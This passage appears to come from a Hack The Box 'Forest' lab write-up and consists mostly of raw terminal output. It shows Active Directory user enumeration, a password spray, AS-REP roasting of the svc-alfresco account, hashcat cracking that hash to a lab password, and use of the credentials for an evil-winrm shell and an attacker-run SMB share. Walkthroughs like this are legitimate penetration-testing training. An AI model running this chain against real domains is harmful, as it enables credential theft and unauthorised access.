        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 23 Sep 2019 16:39:48 IST
        Logoff Time              :      Thu, 01 Jan 1970 05:30:00 IST
        Kickoff Time             :      Thu, 01 Jan 1970 05:30:00 IST
        Password last set Time   :      Sun, 19 Dec 2021 08:31:51 IST
        Password can change Time :      Mon, 20 Dec 2021 08:31:51 IST
        Password must change Time:      Thu, 14 Sep 30828 08:18:05 IST
        unknown_2[0..31]...
        user_rid :      0x47b
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000006
        padding1[0..7]...
        logon_hrs[0..21]...
rpcclient $> 
```



```
crackmapexec smb 10.129.95.210 -u userlist.ldap -p pass 
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019april2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019April2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019ApriL2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AprIl2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019ApRil2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019APril2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019august2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019August2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AugusT2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AuguSt2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AugUst2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AuGust2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AUgust2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019autumn2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019Autumn2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AutumN2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AutuMn2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AutUmn2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AuTumn2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019AUtumn2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019december2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019December2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DecembeR2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DecembEr2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DecemBer2 STATUS_LOGON_FAILURE 
SMB         10.129.95.210   445    FOREST           [-] htb.local\sebastien:019DeceMber2 STATUS_LOGON_FAILURE 
-----------------------------------------------------snip--------------------------------------------------------------------
```



```
(root💀oliver)-[/usr/share/doc/python3-impacket/examples]
└─# python3 GetNPUsers.py -dc-ip 10.129.95.210 -request 'htb.local/'                                                                                                                  127 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-12-19 08:44:15.886122  2019-09-23 16:39:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:397080050ef09a3d3913b2f6280aaac9$070b992609688bb54f0ebf15ea8d6b384f7eda8db49ee0b19fa1b228cea257c38616e52fdd7450a375085d507f9bea610f85ca3789a457af0bb148db22fc84bbac77a223e7439f300c5b73dc6ea14dc07a42e2275d5203d63f3b419998b1d9fea60ad06560602ab42ff94be4a9953fe537dab7ebbd8f0c0eb7623b3e3d8df025ed226dd34d2dc17424e5cef45c58dd99588aed77ed04651afe42e6abe6bcd1e267aaa0612a43cf14fdbfcc108a30b0571c945809e4bf76ae0897b3bbf0c2556ea6171369cce5e127d4a9ea21fc30f8d2cab0f5ad5ff79e04f23b7d7003a950cfa87be09abb17
                                                                                                                                                                                            
┌──(root💀oliver)-[/usr/share/doc/python3-impacket/examples]
└─# python3 GetNPUsers.py -dc-ip 10.129.95.210 -request 'htb.local/' -format hashcat
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2021-12-19 08:44:15.886122  2021-12-19 08:44:52.307826  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:46e9774412bd1ad21a4fce3e5c8341ee$352643c79f9849aaaacf1954b040da65e25260f55cf5aff50e3def71543899d3759be9af00f51c711ed517d894c1fa650c08d1c68a6451d2c51feb284eabddaec1a7b6bc4491db727b939f7353ae0b63735e0a16aa6fc4de44ecceabc086e4feae942b8c830d138917dcea47673e362321c32f2d29c7f06f33afc065913654375d8b89eaeaeb9bb19e41583f24a1e05e3f0040dd0d0a36eb3bf2c6513a5976b9aa8c4434ed196bc6cdf133ffe7b17c6e1dc2caa0c15e51a6f58cef8c2039089c74669ba2a699b895386e3466dce404fce9b1f3643cb979d3d634f0c320a21cb76bfacb227d60


```

```
(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# hashcat --example-hashes | grep -i krb
HASH: $krb5pa$23$user$realm$salt$5cbb0c882a2b26956e81644edbdb746326f4f5f0e947144fb3095dffe4b4b03e854fc1d631323632303636373330383333353630
HASH: $krb5tgs$23$*user$realm$test/spn*$b548e10f5694ae018d7ad63c257af7dc$35e8e45658860bc31a859b41a08989265f4ef8afd75652ab4d7a30ef151bf6350d879ae189a8cb769e01fa573c6315232b37e4bcad9105520640a781e5fd85c09615e78267e494f433f067cc6958200a82f70627ce0eebc2ac445729c2a8a0255dc3ede2c4973d2d93ac8c1a56b26444df300cb93045d05ff2326affaa3ae97f5cd866c14b78a459f0933a550e0b6507bf8af27c2391ef69fbdd649dd059a4b9ae2440edd96c82479645ccdb06bae0eead3b7f639178a90cf24d9a
HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f438a0797dbfb2f8a1a5f4c423f9bfc1fea483342a11bd56a216f4d5158ccc4b224b52894fadfba3957dfe4b6b8f5f9f9fe422811a314768673e0c924340b8ccb84775ce9defaa3baa0910b676ad0036d13032b0dd94e3b13903cc738a7b6d00b0b3c210d1f972a6c7cae9bd3c959acf7565be528fc179118f28c679f6deeee1456f0781eb8154e18e49cb27b64bf74cd7112a0ebae2102ac
HASH: $krb5tgs$17$srv_http$synacktiv.local$849e31b3db1c1f203fa20b85$948690f5875125348286ad3346d27b43eaabc71896b620c16de7ddcdbd561628c650c508856a3f574261948b6db4b48332d30536e978046a423ad4368f9a69b4dc4642dab4e0d475d8299be718fd6f98ac85a771b457b2453e78c9411dfce572b19660fe7a5a8246d9b2a91ea2f14d1986ea0a77ecf9b8330bc8fd9ab540bcf46b74c5aa7005cfccd89ec05f66aeab30c6b2bf8595cf6c9a1b68ad885258850c4b1dd9265f270fb2af52fd76c16246df51ea67efc58a65c345686c84e43642febe908a
HASH: $krb5tgs$18$srv_http$synacktiv.local$16ce51f6eba20c8ee534ff8a$57d07b23643a516834795f0c010da8f549b7e65063e5a367ca9240f9b800adad1734df7e7d5dd8307e785de4f40aacf901df41aa6ce695f8619ec579c1fa57ee93661cf402aeef4e3a42e7e3477645d52c09dc72feade03512dffe0df517344f673c63532b790c242cc1d50f4b4b34976cb6e08ab325b3aefb2684262a5ee9faacb14d059754f50553be5bfa5c4c51e833ff2b6ac02c6e5d4c4eb193e27d7dde301bd1ddf480e5e282b8c27ef37b136c8f140b56de105b73adeb1de16232fa1ab5c9f6
HASH: $krb5pa$17$hashcat$HASHCATDOMAIN.COM$a17776abe5383236c58582f515843e029ecbff43706d177651b7b6cdb2713b17597ddb35b1c9c470c281589fd1d51cca125414d19e40e333
HASH: $krb5pa$18$hashcat$HASHCATDOMAIN.COM$96c289009b05181bfd32062962740b1b1ce5f74eb12e0266cde74e81094661addab08c0c1a178882c91a0ed89ae4e0e68d2820b9cce69770
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# hashcat --example-hashes | less       
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# hashcat -m 18200 hash-alfresco /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule 
hashcat (v6.1.1) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 11.4)
====================
* Device #1: NVIDIA GeForce GTX 1650, 3856/3911 MB, 14MCU

OpenCL API (OpenCL 3.0 CUDA 11.4.158) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: NVIDIA GeForce GTX 1650, skipped

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================
* Device #3: pthread-AMD Ryzen 7 4800H with Radeon Graphics, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 3120

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 309 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 44754481200
* Runtime...: 1 sec

$krb5asrep$23$svc-alfresco@HTB.LOCAL:46e9774412bd1ad21a4fce3e5c8341ee$352643c79f9849aaaacf1954b040da65e25260f55cf5aff50e3def71543899d3759be9af00f51c711ed517d894c1fa650c08d1c68a6451d2c51feb284eabddaec1a7b6bc4491db727b939f7353ae0b63735e0a16aa6fc4de44ecceabc086e4feae942b8c830d138917dcea47673e362321c32f2d29c7f06f33afc065913654375d8b89eaeaeb9bb19e41583f24a1e05e3f0040dd0d0a36eb3bf2c6513a5976b9aa8c4434ed196bc6cdf133ffe7b17c6e1dc2caa0c15e51a6f58cef8c2039089c74669ba2a699b895386e3466dce404fce9b1f3643cb979d3d634f0c320a21cb76bfacb227d60:s3rvice
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:46e9774412bd1a...227d60
Time.Started.....: Sun Dec 19 08:49:01 2021 (2 secs)
Time.Estimated...: Sun Dec 19 08:49:03 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 26556.9 kH/s (4.99ms) @ Accel:2 Loops:128 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 29560832/44754481200 (0.07%)
Rejected.........: 0/29560832 (0.00%)
Restore.Point....: 8960/14344385 (0.06%)
Restore.Sub.#1...: Salt:0 Amplifier:768-896 Iteration:0-128
Candidates.#1....: 01+0106 -> ble0s
Hardware.Mon.#1..: Temp: 50c Util: 56% Core:1785MHz Mem:5000MHz Bus:8

Started: Sun Dec 19 08:48:38 2021
Stopped: Sun Dec 19 08:49:03 2021
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# nvim cred         
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice         
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
                                                                                                                                                                                            
┌──(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice --shares
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.95.210   445    FOREST           [+] Enumerated shares
SMB         10.129.95.210   445    FOREST           Share           Permissions     Remark
SMB         10.129.95.210   445    FOREST           -----           -----------     ------
SMB         10.129.95.210   445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.95.210   445    FOREST           C$                              Default share
SMB         10.129.95.210   445    FOREST           IPC$                            Remote IPC
SMB         10.129.95.210   445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.95.210   445    FOREST           SYSVOL          READ            Logon server share 
                                                                                                          
```


```
(root💀oliver)-[~/Downloads/hackthebox/Forest]
└─# evil-winrm -u svc-alfresco -p s3rvice -i 10.129.95.210

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```


```
impacket-smbserver share . -smb2support -user df -password df                                                                                                                     127 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.95.210,59881)
[*] AUTHENTICATE_MESSAGE (\df,FOREST)
```
